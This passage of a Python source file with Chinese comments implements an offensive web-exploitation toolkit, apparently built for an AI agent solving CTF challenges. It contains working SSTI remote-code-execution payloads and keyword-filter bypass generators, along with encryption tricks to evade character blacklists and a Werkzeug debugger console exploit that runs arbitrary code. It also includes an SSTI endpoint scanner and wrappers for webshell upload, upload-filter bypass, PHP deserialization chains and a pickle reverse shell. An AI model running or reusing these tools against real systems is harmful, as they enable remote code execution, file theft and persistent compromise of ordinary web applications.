                output = base64.b64encode(result_bytes).decode()
            elif output_format == "url":
                import urllib.parse
                output = urllib.parse.quote_from_bytes(result_bytes)
            else:
                output = result_bytes.decode("utf-8", errors="replace")

            return {
                "success": True,
                "algorithm": "rc4",
                "input_format": input_format,
                "output_format": output_format,
                "result": output,
                "data_length": len(data_bytes),
            }
        except Exception as e:
            return {"success": False, "error": str(e)}

    async def xor_crypt(self, data: str, key: str, output_format: str = "hex",
                         input_format: str = "utf8") -> Dict[str, Any]:
        """XOR加密/解密(对称)

        data: 待处理数据
        key: XOR密钥(字符串)或0x前缀的十六进制(如 0x55 表示单字节key)
        output_format: hex/base64/url/utf8
        input_format: utf8/hex/base64
        """
        try:
            if input_format == "hex":
                data_bytes = bytes.fromhex(data)
            elif input_format == "base64":
                data_bytes = base64.b64decode(data)
            else:
                data_bytes = data.encode("utf-8")

            # 支持单字节0xNN写法
            if isinstance(key, str) and key.startswith("0x"):
                key_bytes = bytes([int(key, 16) & 0xFF])
            else:
                key_bytes = key.encode("utf-8") if isinstance(key, str) else key

            result_bytes = self._xor(data_bytes, key_bytes)

            if output_format == "hex":
                output = result_bytes.hex()
            elif output_format == "base64":
                output = base64.b64encode(result_bytes).decode()
            elif output_format == "url":
                import urllib.parse
                output = urllib.parse.quote_from_bytes(result_bytes)
            else:
                output = result_bytes.decode("utf-8", errors="replace")

            return {
                "success": True,
                "algorithm": "xor",
                "key_length": len(key_bytes),
                "input_format": input_format,
                "output_format": output_format,
                "result": output,
                "data_length": len(data_bytes),
            }
        except Exception as e:
            return {"success": False, "error": str(e)}

    async def generate_ssti_encrypted_payload(self, payload: str, algorithm: str = "rc4",
                                               key: str = "", output_format: str = "url",
                                               forbidden_chars: str = "") -> Dict[str, Any]:
        """生成加密后的SSTI payload

        解决 safe() 等过滤函数黑名单场景: 加密后字节分布改变，可绕过字符过滤。
        若加密结果仍含禁止字符，会返回警告并建议更换payload。

        payload: SSTI payload明文，如 {{config}} 或 {{7*7}}
        algorithm: rc4 / xor
        key: 密钥(xor支持0xNN单字节)
        output_format: url(默认，可直接作为参数值) / hex / base64
        forbidden_chars: 禁止字符(如 "<>;"，URL编码后的%等)
        """
        if not key:
            return {"success": False, "error": "必须提供key参数"}
        algorithm = algorithm.lower().strip()
        if algorithm not in ("rc4", "xor"):
            return {"success": False, "error": "algorithm只支持 rc4 或 xor"}

        try:
            data_bytes = payload.encode("utf-8")
            if isinstance(key, str) and key.startswith("0x") and algorithm == "xor":
                key_bytes = bytes([int(key, 16) & 0xFF])
            else:
                key_bytes = key.encode("utf-8") if isinstance(key, str) else key

            if algorithm == "rc4":
                result_bytes = self._rc4(data_bytes, key_bytes)
            else:
                result_bytes = self._xor(data_bytes, key_bytes)

            import urllib.parse
            if output_format == "hex":
                output = result_bytes.hex()
            elif output_format == "base64":
                output = base64.b64encode(result_bytes).decode()
            else:  # url
                output = urllib.parse.quote_from_bytes(result_bytes)

            info = {
                "success": True,
                "algorithm": algorithm,
                "key": key,
                "original_payload": payload,
                "output_format": output_format,
                "encrypted": output,
                "encrypted_length": len(result_bytes),
                "usage": (
                    "将encrypted值作为参数提交到SSTI接口。"
                    "加密后字节经过URL编码，可绕过基于字符黑名单的过滤函数(如safe()过滤 <>;|)。"
                ),
            }

            # 检查禁止字符
            if forbidden_chars:
                forbidden = set(forbidden_chars)
                # 检查URL编码后的形式是否包含禁止字符(通常URL编码后都是%XX，不含原始禁止字符)
                url_decoded = urllib.parse.unquote(output)
                hit = [c for c in forbidden if c in url_decoded]
                if hit:
                    info["warning"] = f"URL解码后仍含禁止字符: {hit}，建议更换payload或密钥"
                else:
                    info["bypass_check"] = "通过: URL编码形式不含禁止字符"

            return info
        except Exception as e:
            return {"success": False, "error": str(e)}


class WerkzeugDebuggerTool:
    """Werkzeug调试器控制台自动利用工具

    解决CTF中Flask debug模式开启但需要SECRET/PIN的场景。
    Werkzeug < 2.1: 控制台执行需 s=sha1(cmd+secret).hexdigest()
    Werkzeug >= 2.1: 需先通过PIN认证
    """

    @staticmethod
    def _compute_s(cmd: str, secret: str) -> str:
        import hashlib
        return hashlib.sha1(f"{cmd}{secret}".encode("utf-8")).hexdigest()

    async def exec(self, base_url: str, code: str, secret: str = "",
                    pin: str = "") -> Dict[str, Any]:
        """通过Werkzeug调试器控制台执行Python代码

        base_url: 目标URL根 (如 http://target:5000)
        code: 要执行的Python代码 (如 print(open('/etc/passwd').read()))
        secret: 调试器SECRET (从源码中提取，非Flask SECRET_KEY)
        pin: 若Werkzeug>=2.1需要PIN认证
        """
        import aiohttp
        from urllib.parse import urljoin

        base_url = base_url.rstrip("/")
        # 去除可能的路径后缀，取根
        from urllib.parse import urlparse
        parsed = urlparse(base_url)
        root_url = f"{parsed.scheme}://{parsed.netloc}/"

        try:
            timeout = aiohttp.ClientTimeout(total=15)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                # 1. 如果需要PIN认证，先尝试认证
                pin_authenticated = False
                if pin:
                    pin_cmd = "pinauth"
                    pin_s = self._compute_s(pin_cmd, secret) if secret else ""
                    pin_url = f"{root_url}?__debugger__=yes&cmd={pin_cmd}&pin={pin}&s={pin_s}"
                    async with session.get(pin_url) as resp:
                        pin_resp = await resp.text()
                        if "true" in pin_resp.lower() or "auth" not in pin_resp.lower():
                            pin_authenticated = True
                        else:
                            return {
                                "success": False,
                                "error": "PIN认证失败",
                                "pin_response": pin_resp[:500],
                                "hint": "PIN错误或Werkzeug版本不匹配，尝试用 probe_pin 获取正确PIN",
                            }

                # 2. 执行代码
                if secret and not pin_authenticated and not pin:
                    # Werkzeug < 2.1: 直接用secret计算s参数
                    s = self._compute_s(code, secret)
                    exec_url = (
                        f"{root_url}?__debugger__=yes&cmd={code}"
                        f"&frm=eval(0)&s={s}"
                    )
                elif pin_authenticated:
                    # PIN认证后，仍需s参数
                    s = self._compute_s(code, secret) if secret else ""
                    exec_url = (
                        f"{root_url}?__debugger__=yes&cmd={code}"
                        f"&frm=eval(0)&s={s}"
                    )
                else:
                    return {
                        "success": False,
                        "error": "缺少secret或pin，无法构造调试器请求",
                        "hint": "Werkzeug<2.1需要secret; Werkzeug>=2.1需要pin(可能也需secret)",
                    }

                async with session.get(exec_url) as resp:
                    status = resp.status
                    body = await resp.text()
                    # Werkzeug调试器响应通常是JSON或纯文本
                    return {
                        "success": True,
                        "status": status,
                        "executed_code": code,
                        "url": exec_url[:200],
                        "response": body[:3000],
                        "pin_authenticated": pin_authenticated,
                        "hint": (
                            "若response为空或报错，检查: 1) secret是否正确 2) Werkzeug版本 3) 调试器是否开启"
                        ) if status != 200 or not body else "执行成功",
                    }
        except asyncio.TimeoutError:
            return {"success": False, "error": "调试器请求超时"}
        except aiohttp.ClientError as e:
            return {"success": False, "error": f"HTTP请求失败: {e}"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    async def probe(self, base_url: str) -> Dict[str, Any]:
        """探测Werkzeug调试器是否存在及所需认证方式

        返回: 是否开启调试器、是否需要PIN、SECRET提取建议
        """
        import aiohttp
        from urllib.parse import urlparse

        base_url = base_url.rstrip("/")
        parsed = urlparse(base_url)
        root_url = f"{parsed.scheme}://{parsed.netloc}"

        try:
            timeout = aiohttp.ClientTimeout(total=10)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                # 1. 检查 /console 页面
                console_url = f"{root_url}/console"
                async with session.get(console_url) as resp:
                    console_status = resp.status
                    console_body = await resp.text()

                debugger_found = False
                needs_pin = False
                version_hint = ""

                if console_status == 200 and (
                    "Werkzeug" in console_body or "debugger" in console_body.lower()
                    or "console" in console_body.lower()
                ):
                    debugger_found = True
                    # 检查是否提示需要PIN
                    if "pin" in console_body.lower() or "enter pin" in console_body.lower():
                        needs_pin = True
                        version_hint = "Werkzeug >= 2.1 (需要PIN认证)"
                    else:
                        version_hint = "Werkzeug < 2.1 (可能只需SECRET)"

                # 2. 构造故意错误，检查错误页是否含调试器
                if not debugger_found:
                    err_url = f"{root_url}/?__debugger__=yes&cmd=help&s=invalid"
                    async with session.get(err_url) as resp:
                        err_body = await resp.text()
                        if "Werkzeug" in err_body or "debugger" in err_body.lower():
                            debugger_found = True
                            version_hint = "调试器存在(通过错误页检测)"

                return {
                    "success": True,
                    "debugger_found": debugger_found,
                    "console_status": console_status,
                    "needs_pin": needs_pin,
                    "version_hint": version_hint,
                    "suggestion": (
                        "若debugger_found=true:\n"
                        "1. 从源码/配置中提取SECRET(Werkzeug<2.1)或PIN(Werkzeug>=2.1)\n"
                        "2. 用 werkzeug_debugger_exec 执行代码\n"
                        "3. PIN通常基于机器信息自动生成，可从 /console 页面或错误页泄露信息中提取\n"
                        "4. 若无法获取PIN，尝试从环境变量、/proc/self/environ、app.config中读取"
                    ) if debugger_found else "未检测到Werkzeug调试器，可能未开启debug模式",
                }
        except asyncio.TimeoutError:
            return {"success": False, "error": "探测超时"}
        except aiohttp.ClientError as e:
            return {"success": False, "error": f"HTTP请求失败: {e}"}
        except Exception as e:
            return {"success": False, "error": str(e)}


class SSTIRouteProbeTool:
    """SSTI入口路由自动探测工具

    遍历常见路径和参数名，用 {{7*7}} 标记检测哪些路由存在模板渲染。
    解决Agent只在单一路由尝试注入导致漏判的问题。
    """

    DEFAULT_PATHS = [
        "/", "/index", "/home", "/search", "/render", "/template",
        "/view", "/display", "/profile", "/user", "/admin", "/flag",
        "/source", "/app", "/src", "/secret", "/input", "/page",
        "/msg", "/hello", "/welcome", "/name",
    ]

    DEFAULT_PARAMS = ["name", "input", "query", "search", "id", "page",
                      "content", "data", "text", "msg", "value", "secret",
                      "cmd", "user", "tpl", "template"]

    MARKER_PAYLOAD = "{{7*7}}"
    EXPECTED = "49"

    async def probe(self, base_url: str, paths: str = "",
                     params: str = "", test_payload: str = "") -> Dict[str, Any]:
        """探测SSTI入口

        base_url: 目标根URL
        paths: 自定义路径列表(逗号分隔)，留空用默认列表
        params: 自定义参数名列表(逗号分隔)，留空用默认列表
        test_payload: 自定义测试payload，默认 {{7*7}}
        """
        import aiohttp
        from urllib.parse import urljoin, urlencode

        base_url = base_url.rstrip("/")
        path_list = [p.strip() for p in paths.split(",") if p.strip()] if paths else self.DEFAULT_PATHS
        param_list = [p.strip() for p in params.split(",") if p.strip()] if params else self.DEFAULT_PARAMS
        payload = test_payload or self.MARKER_PAYLOAD
        expected = str(eval(f"{payload.strip('{}').strip()}")) if payload.strip("{{}}").strip().replace(" ", "").isalnum() else self.EXPECTED

        hits = []
        tested = 0
        errors = []

        try:
            timeout = aiohttp.ClientTimeout(total=20)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                for path in path_list:
                    # 规范化路径
                    if not path.startswith("/"):
                        path = "/" + path
                    target = f"{base_url}{path}"

                    for param in param_list:
                        tested += 1
                        try:
                            # GET 参数测试
                            qs = urlencode({param: payload})
                            url = f"{target}?{qs}"
                            async with session.get(url) as resp:
                                if resp.status != 200:
                                    continue
                                body = await resp.text()
                                if expected in body and payload not in body:
                                    # payload被渲染，expected出现在响应中
                                    hits.append({
                                        "method": "GET",
                                        "path": path,
                                        "param": param,
                                        "evidence": expected,
                                        "response_snippet": body[:200],
                                    })

                            # POST 表单测试
                            async with session.post(target, data={param: payload}) as resp:
                                if resp.status != 200:
                                    continue
                                body = await resp.text()
                                if expected in body and payload not in body:
                                    hits.append({
                                        "method": "POST",
                                        "path": path,
                                        "param": param,
                                        "evidence": expected,
                                        "response_snippet": body[:200],
                                    })
                        except asyncio.TimeoutError:
                            continue
                        except aiohttp.ClientError as e:
                            errors.append(f"{path}?{param}: {e}")
                            continue

            return {
                "success": True,
                "base_url": base_url,
                "tested": tested,
                "hits": hits,
                "hit_count": len(hits),
                "errors": errors[:10],
                "suggestion": (
                    f"发现{len(hits)}个SSTI入口。下一步:\n"
                    "1. 对命中的path+param组合用 fenjing_scan 或手写payload深入利用\n"
                    "2. 尝试 {{config}} 识别框架(Flask/Jinja2)\n"
                    "3. 若接口对输入做加密，用 crypto_detect 识别算法再用 generate_ssti_encrypted_payload 生成加密payload"
                ) if hits else "未发现SSTI入口，建议: 1)检查是否有加密层 2)扩大路径列表 3)检查请求头/cookie注入点",
            }
        except Exception as e:
            return {"success": False, "error": str(e)}


file_upload_tool = FileUploadTool()
flask_session_tool = FlaskSessionTool()
deserialize_tool = DeserializeTool()
crypto_analysis_tool = CryptoAnalysisTool()
werkzeug_debugger_tool = WerkzeugDebuggerTool()
ssti_route_probe_tool = SSTIRouteProbeTool()


async def file_upload(url: str, filename: str = "", content: str = "",
                      field_name: str = "file", content_type: str = "",
                      extra_fields: str = "") -> Dict[str, Any]:
    return await file_upload_tool.upload(url, filename, content, field_name, content_type, extra_fields)


async def file_upload_webshell(url: str, shell_type: str = "php",
                                field_name: str = "file", extra_fields: str = "") -> Dict[str, Any]:
    return await file_upload_tool.upload_webshell(url, shell_type, field_name, extra_fields)


async def file_upload_bypass(url: str, field_name: str = "file",
                              extra_fields: str = "") -> Dict[str, Any]:
    return await file_upload_tool.bypass_upload(url, field_name, extra_fields)


async def file_upload_auto(url: str, base_url: str = "",
                            field_name: str = "file",
                            extra_fields: str = "") -> Dict[str, Any]:
    """自动上传+验证：多策略轮询，自动验证PHP解析是否生效

    策略顺序:
    1. 直接上传.php(script标签绕过)
    2. .htaccess(FilesMatch纯文本) + shell.jpg
    3. .user.ini + shell.jpg
    4. 扩展名绕过(.phtml/.php5/.PHP等)
    5. 图片马(.php.jpg)
    6. phpinfo信息泄露
    每步自动验证，成功即返回shell_url。
    """
    return await file_upload_tool.auto_upload_and_verify(url, base_url, field_name, extra_fields)


async def flask_session_decode(cookie: str, secret_key: str = "") -> Dict[str, Any]:
    return await flask_session_tool.decode(cookie, secret_key)


async def flask_session_encode(data: str, secret_key: str) -> Dict[str, Any]:
    return await flask_session_tool.encode(data, secret_key)


async def flask_session_brute(cookie: str, wordlist: str = "") -> Dict[str, Any]:
    return await flask_session_tool.brute_secret(cookie, wordlist)


async def php_deserialize_generate(gadget_type: str = "rce", command: str = "id",
                                    class_name: str = "Exploit", props: str = "",
                                    wakeup_bypass: bool = False, extra_count: int = 0) -> Dict[str, Any]:
    return await deserialize_tool.php_generate(
        gadget_type, command, class_name, props, wakeup_bypass, extra_count
    )


async def php_deserialize_pop(entry_class: str, chain: str, command: str = "id") -> Dict[str, Any]:
    return await deserialize_tool.php_pop_chain(entry_class, chain, command)


async def php_reference_bypass(class_name: str, props: str, command: str = "id") -> Dict[str, Any]:
    return await deserialize_tool.php_reference_bypass(class_name, props, command)


async def php_reference_bypass_auto(class_name: str, command: str = "ls -la /",
                                     ref_target: str = "b", ref_src: str = "a",
                                     command_prop: str = "c") -> Dict[str, Any]:
    return await deserialize_tool.php_reference_bypass_auto(
        class_name, command, ref_target, ref_src, command_prop
    )


async def python_pickle_generate(command: str = "id") -> Dict[str, Any]:
    return await deserialize_tool.python_pickle(command)


async def python_pickle_reverse_shell(host: str, port: int) -> Dict[str, Any]:
    return await deserialize_tool.python_pickle_reverse_shell(host, port)


# === 加密分析与加密SSTI工具 ===
async def crypto_detect(samples: str) -> Dict[str, Any]:
    return await crypto_analysis_tool.detect(samples)


async def rc4_crypt(data: str, key: str, output_format: str = "hex",
                    input_format: str = "utf8") -> Dict[str, Any]:
    return await crypto_analysis_tool.rc4_crypt(data, key, output_format, input_format)


async def xor_crypt(data: str, key: str, output_format: str = "hex",
                     input_format: str = "utf8") -> Dict[str, Any]:
    return await crypto_analysis_tool.xor_crypt(data, key, output_format, input_format)


async def generate_ssti_encrypted_payload(payload: str, algorithm: str = "rc4",
                                           key: str = "", output_format: str = "url",
                                           forbidden_chars: str = "") -> Dict[str, Any]:
    return await crypto_analysis_tool.generate_ssti_encrypted_payload(
        payload, algorithm, key, output_format, forbidden_chars
    )


# === Werkzeug调试器工具 ===
async def werkzeug_debugger_exec(base_url: str, code: str, secret: str = "",
                                  pin: str = "") -> Dict[str, Any]:
    return await werkzeug_debugger_tool.exec(base_url, code, secret, pin)


async def werkzeug_debugger_probe(base_url: str) -> Dict[str, Any]:
    return await werkzeug_debugger_tool.probe(base_url)


# === SSTI路由探测工具 ===
async def ssti_route_probe(base_url: str, paths: str = "",
                            params: str = "", test_payload: str = "") -> Dict[str, Any]:
    return await ssti_route_probe_tool.probe(base_url, paths, params, test_payload)


class SSTIBypassTool:
    """SSTI绕过辅助工具

    内置常见SSTI绕过模板，针对safe()等黑名单过滤函数。
    自动生成绕过payload，支持:
    - 关键字绕过(class/mro/read/popen等)
    - 字符拼接绕过
    - attr过滤器绕过
    - hex/unicode编码绕过
    - 加密层绕过(配合rc4_crypt)
    """

    # 常见过滤关键字及绕过方式
    BYPASS_TEMPLATES = {
        # 读取文件 - 绕过 read/open 关键字
        "read_file": [
            # 方式1: 用attr过滤器绕过
            "{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(132)|attr('__init__')|attr('__globals__')|attr('__getitem__')('sys')|attr('modules')|attr('__getitem__')('os')|attr('popen')('cat /flag')|attr('read')()}}",
            # 方式2: 用中括号+拼接绕过
            "{{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['sys'].modules['os'].popen('cat /flag').read()}}",
            # 方式3: 用lipsum绕过
            "{{lipsum.__globals__['os'].popen('cat /flag').read()}}",
            # 方式4: 用cycler绕过
            "{{cycler.__init__.__globals__.os.popen('cat /flag').read()}}",
            # 方式5: 用request对象绕过
            "{{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag').read()}}",
        ],
        # 命令执行 - 绕过 popen/system 关键字
        "rce": [
            "{{lipsum.__globals__['os'].popen('id').read()}}",
            "{{cycler.__init__.__globals__.os.popen('id').read()}}",
            "{{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['sys'].modules['os'].popen('id').read()}}",
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "{{url_for.__globals__['__builtins__']['__import__']('os').popen('id').read()}}",
        ],
        # 列目录 - 绕过 listdir
        "list_dir": [
            "{{lipsum.__globals__['os'].listdir('/')}}",
            "{{cycler.__init__.__globals__.os.listdir('/')}}",
            "{{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['sys'].modules['os'].listdir('/')}}",
        ],
        # 读取配置 - 绕过 config
        "config": [
            "{{config}}",
            "{{self.__dict__}}",
            "{{url_for.__globals__}}",
            "{{get_flashed_messages.__globals__}}",
        ],
    }

    # 关键字绕过映射表
    KEYWORD_BYPASS = {
        "class": ["__class__", "attr('__class__')", "'__cl''ass__'", "'__cla'+'ss__'"],
        "mro": ["__mro__", "attr('__mro__')", "'__m''ro__'", "'__m'+'ro__'"],
        "read": ["read", "attr('read')", "'re''ad'", "'re'+'ad'"],
        "popen": ["popen", "attr('popen')", "'po''pen'", "'po'+'pen'"],
        "open": ["open", "attr('open')", "'op''en'", "'op'+'en'"],
        "system": ["system", "attr('system')", "'sys''tem'", "'sys'+'tem'"],
        "import": ["__import__", "attr('__import__')", "'__imp''ort__'", "'__imp'+'ort__'"],
        "eval": ["eval", "attr('eval')", "'ev''al'", "'ev'+'al'"],
        "globals": ["__globals__", "attr('__globals__')", "'__glob''als__'", "'__glob'+'als__'"],
        "builtins": ["__builtins__", "attr('__builtins__')", "'__buil''tins__'", "'__buil'+'tins__'"],
        "subclasses": ["__subclasses__", "attr('__subclasses__')", "'__subcl''asses__'", "'__subcl'+'asses__'"],
        "init": ["__init__", "attr('__init__')", "'__in''it__'", "'__in'+'it__'"],
    }

    async def generate_bypass(self, target: str = "read_file", command: str = "cat /flag",
                               forbidden_chars: str = "", forbidden_keywords: str = "",
                               custom_payload: str = "") -> Dict[str, Any]:
        """生成SSTI绕过payload

        target: 目标类型(read_file/rce/list_dir/config)
        command: 要执行的命令(如 cat /flag, id)
        forbidden_chars: 禁止的字符(如 "<>;|")
        forbidden_keywords: 禁止的关键字(逗号分隔,如 "class,mro,read,popen")
        custom_payload: 自定义payload模板(提供时基于此绕过)
        """
        results = []

        # 如果有自定义payload，基于此进行绕过
        if custom_payload:
            bypassed = self._apply_keyword_bypass(custom_payload, forbidden_keywords)
            results.append({
                "method": "custom_bypass",
                "payload": bypassed,
                "description": f"基于自定义模板，绕过关键字: {forbidden_keywords}",
            })
        else:
            # 使用内置模板
            templates = self.BYPASS_TEMPLATES.get(target, self.BYPASS_TEMPLATES["read_file"])
            for i, template in enumerate(templates):
                # 替换命令
                payload = template.replace("cat /flag", command).replace("id", command)
                # 应用关键字绕过
                if forbidden_keywords:
                    payload = self._apply_keyword_bypass(payload, forbidden_keywords)
                # 检查是否含禁止字符
                has_forbidden = False
                if forbidden_chars:
                    for c in forbidden_chars:
                        if c in payload:
                            has_forbidden = True
                            break
                results.append({
                    "method": f"template_{i+1}",
                    "payload": payload,
                    "has_forbidden_char": has_forbidden,
                    "description": self._describe_method(i),
                })

        # 过滤掉含禁止字符的结果
        usable = [r for r in results if not r.get("has_forbidden_char", False)]

        return {
            "success": True,
            "target": target,
            "command": command,
            "forbidden_keywords": forbidden_keywords,
            "forbidden_chars": forbidden_chars,
            "total_generated": len(results),
            "usable_count": len(usable),
            "results": results,
            "usable_payloads": [r["payload"] for r in usable],
            "suggestion": (
                f"生成了{len(results)}个payload，其中{len(usable)}个可用。\n"
                "下一步:\n"
                "1. 用 http_get/http_post 提交usable_payloads中的payload\n"
                "2. 若接口有加密层，用 generate_ssti_encrypted_payload 加密后再提交\n"
                "3. 若所有payload都含禁止字符，考虑用编码绕过(hex/unicode)或加密绕过"
            ) if usable else "所有payload都含禁止字符，建议: 1)用加密绕过(generate_ssti_encrypted_payload) 2)用hex编码绕过 3)用fenjing_scan自动绕过",
        }

    def _apply_keyword_bypass(self, payload: str, forbidden_keywords: str) -> str:
        """对payload应用关键字绕过"""
        if not forbidden_keywords:
            return payload
        keywords = [k.strip() for k in forbidden_keywords.split(",") if k.strip()]
        for kw in keywords:
            if kw in self.KEYWORD_BYPASS:
                bypasses = self.KEYWORD_BYPASS[kw]
                # 优先用attr()方式绕过
                bypass = bypasses[1] if len(bypasses) > 1 else bypasses[0]
                # 对于 __keyword__ 形式，替换为attr形式
                if f"__{kw}__" in payload:
                    payload = payload.replace(f"__{kw}__", f"|attr('{bypass}')")
                    # 去掉多余的 |attr 前缀
                    payload = payload.replace(f"|attr('|attr('", "|attr('").replace("')')", "')")
                # 直接匹配关键字
                elif kw in payload and f"__{kw}__" not in payload:
                    # 用字符串拼接绕过
                    split_pos = len(kw) // 2
                    bypass_str = f"'{kw[:split_pos]}'+'{kw[split_pos:]}'"
                    payload = payload.replace(kw, bypass_str)
        return payload

    @staticmethod
    def _describe_method(index: int) -> str:
        descriptions = [
            "用attr()过滤器绕过关键字过滤",
            "直接使用魔术方法(无过滤时推荐)",
            "用lipsum全局对象绕过",
            "用cycler全局对象绕过",
            "用request对象绕过",
        ]
        return descriptions[index] if index < len(descriptions) else f"绕过方法{index+1}"


# HTTP重试辅助工具
class HTTPRetryHelper:
    """HTTP请求指数退避重试辅助工具

    解决CTF靶场不稳定导致请求超时的问题。
    """

    @staticmethod
    async def request_with_retry(url: str, method: str = "GET", data: str = "",
                                  headers: str = "", max_retries: int = 3,
                                  base_delay: float = 1.0) -> Dict[str, Any]:
        """带指数退避重试的HTTP请求

        url: 目标URL
        method: GET/POST
        data: POST数据(JSON字符串或key=value&key=value格式)
        headers: 自定义头(JSON字符串)
        max_retries: 最大重试次数
        base_delay: 基础延迟(秒)，实际延迟=base_delay * 2^retry
        """
        import aiohttp
        import json as _json

        # 解析headers
        hdrs = {}
        if headers:
            try:
                hdrs = _json.loads(headers)
            except _json.JSONDecodeError:
                # 尝试 key: value\nkey: value 格式
                for line in headers.split("\n"):
                    if ":" in line:
                        k, v = line.split(":", 1)
                        hdrs[k.strip()] = v.strip()

        last_error = ""
        for attempt in range(max_retries + 1):
            try:
                timeout = aiohttp.ClientTimeout(total=15)
                async with aiohttp.ClientSession(timeout=timeout) as session:
                    if method.upper() == "GET":
                        async with session.get(url, headers=hdrs) as resp:
                            body = await resp.text()
                            return {
                                "success": True,
                                "status": resp.status,
                                "body": body[:5000],
                                "url": url,
                                "attempts": attempt + 1,
                                "headers": dict(resp.headers),
                            }
                    else:
                        # POST
                        if data.startswith("{"):
                            # JSON
                            try:
                                json_data = _json.loads(data)
                                async with session.post(url, json=json_data, headers=hdrs) as resp:
                                    body = await resp.text()
                                    return {
                                        "success": True,
                                        "status": resp.status,
                                        "body": body[:5000],
                                        "url": url,
                                        "attempts": attempt + 1,
                                        "headers": dict(resp.headers),
                                    }
                            except _json.JSONDecodeError:
                                pass
                        # form data
                        form_data = {}
                        for pair in data.split("&"):
                            if "=" in pair:
                                k, v = pair.split("=", 1)
                                form_data[k] = v
                        async with session.post(url, data=form_data, headers=hdrs) as resp:
                            body = await resp.text()
                            return {
                                "success": True,
                                "status": resp.status,
                                "body": body[:5000],
                                "url": url,
                                "attempts": attempt + 1,
                                "headers": dict(resp.headers),
                            }
            except asyncio.TimeoutError:
                last_error = "请求超时"
                if attempt < max_retries:
                    delay = base_delay * (2 ** attempt)
                    await asyncio.sleep(delay)
            except aiohttp.ClientError as e:
                last_error = str(e)
                if attempt < max_retries:
                    delay = base_delay * (2 ** attempt)
                    await asyncio.sleep(delay)
            except Exception as e:
                last_error = str(e)
                if attempt < max_retries:
                    delay = base_delay * (2 ** attempt)
                    await asyncio.sleep(delay)

        return {
            "success": False,
            "error": f"重试{max_retries}次后仍失败: {last_error}",
            "url": url,
            "attempts": max_retries + 1,
        }


ssti_bypass_tool = SSTIBypassTool()
http_retry_helper = HTTPRetryHelper()


# === SSTI绕过辅助工具 ===
async def ssti_bypass_generate(target: str = "read_file", command: str = "cat /flag",
                                forbidden_chars: str = "", forbidden_keywords: str = "",
                                custom_payload: str = "") -> Dict[str, Any]:
    return await ssti_bypass_tool.generate_bypass(target, command, forbidden_chars, forbidden_keywords, custom_payload)


# === HTTP重试请求工具 ===
async def http_request_retry(url: str, method: str = "GET", data: str = "",
                              headers: str = "", max_retries: int = 3,
                              base_delay: float = 1.0) -> Dict[str, Any]:
    return await http_retry_helper.request_with_retry(url, method, data, headers, max_retries, base_delay)


# === HTTP原始请求工具（解决AI生成Python代码语法错误问题）===
def _looks_like_html(text: str) -> bool:
    """判断响应体是否为HTML页面（用于决定是否做归一化）"""
    import re as _re
    head = text[:1000].lstrip().lower()
    return head.startswith("<!doctype") or head.startswith("<html") or bool(
        _re.search(r"<(html|body|code|pre|div|span|h[1-6]|p)\b", head))


def _normalize_html(text: str) -> str:
    """HTML→可读文本：样式标签剥离、块级标签转换行、实体反转义。

    动机：CTF源码查看页含大量<span style=...>高亮标签（撑大体积）和
    &lt;?php 实体转义（难读）。归一化后源码直接可读，体积缩小数倍，
    天然落入下游2000字符截断上限内，Agent无需绕路获取完整源码。
    """
    import re as _re
    import html as _html
    # 块级标签闭合处转换行，保留文本流边界
    t = _re.sub(r"(?i)<br\s*/?>", "\n", text)
    t = _re.sub(r"(?i)</(p|div|h[1-6]|li|tr|code|pre)>", "\n", t)
    # 剥掉剩余标签（含<span style=...>高亮标签），限长防贪婪匹配失控
    t = _re.sub(r"<[^<>\n]{0,300}>", "", t)
    # 实体反转义：&lt;→< &gt;→> &amp;→& &quot;→" &#39;→'
    t = _html.unescape(t)
    # 压缩连续空行
    t = _re.sub(r"\n{3,}", "\n\n", t)
    return t.strip()


async def http_raw(url: str, method: str = "GET", headers: str = "",
                   body: str = "", follow_redirects: bool = True,
                   timeout: int = 15, body_offset: int = 0,
                   body_limit: int = 10000) -> Dict[str, Any]:
    """高级HTTP请求工具，支持自定义headers/method/body，替代execute_python写HTTP请求。

    优势：不需要写Python代码，避免f-string花括号语法错误。

    Args:
        url: 目标URL (如 http://target:8080/path?param=value)
        method: HTTP方法 (GET/POST/PUT/DELETE/HEAD/OPTIONS/PATCH)
        headers: 自定义头，支持两种格式：
                 - JSON字符串: '{"User-Agent": "Mozilla/5.0", "X-Forwarded-For": "127.0.0.1"}'
                 - 换行格式: 'User-Agent: Mozilla/5.0\\nX-Forwarded-For: 127.0.0.1'
        body: 请求体 (POST/PUT时使用)，按原始字节发送，工具不做任何编码/解码转换：
              - JSON字符串: '{"key": "value"}'
              - 表单格式: 'key=value&key2=value2'
              - 原始文本: 直接传入
              注意：**默认直接传原始字符，不要预先URL编码**。是否解码取决于服务端：
              $_POST标准表单解析会自动解码（原始字符即可）；php://input等原始读取
              会原样接收（更应传原始字符）。若报错含 unexpected '%'，说明服务端
              收到了编码后的%序列，改传原始未编码字符即可。
        follow_redirects: 是否跟随重定向 (默认True)
        timeout: 超时秒数 (默认15)
        body_offset: body分段获取的起始位置 (默认0)。用于结果被截断时补全
        body_limit: 本次返回的body最大长度 (默认10000)
        注意：切片基于归一化后的文本（HTML已剥标签+反转义），offset即实际返回body中的位置

    Returns:
        dict: {success, status, body, body_total, body_offset, body_truncated,
               _kind, headers, url, redirects}
        body_truncated=True时，用 body_offset=已取到的末尾位置 继续分段获取
    """
    import aiohttp
    import json as _json

    # 解析headers
    hdrs = {}
    if headers:
        try:
            hdrs = _json.loads(headers)
        except _json.JSONDecodeError:
            for line in headers.split("\n"):
                line = line.strip()
                if ":" in line:
                    k, v = line.split(":", 1)
                    hdrs[k.strip()] = v.strip()

    redirects = []
    try:
        timeout_cfg = aiohttp.ClientTimeout(total=timeout)
        connector = aiohttp.TCPConnector(ssl=False)

        async with aiohttp.ClientSession(
            timeout=timeout_cfg,
            connector=connector,
            auto_decompress=True,
        ) as session:
            # 构造请求参数
            kwargs = {"headers": hdrs}
            if follow_redirects:
                kwargs["allow_redirects"] = True
            else:
                kwargs["allow_redirects"] = False

            # 处理请求体
            if body and method.upper() in ("POST", "PUT", "PATCH"):
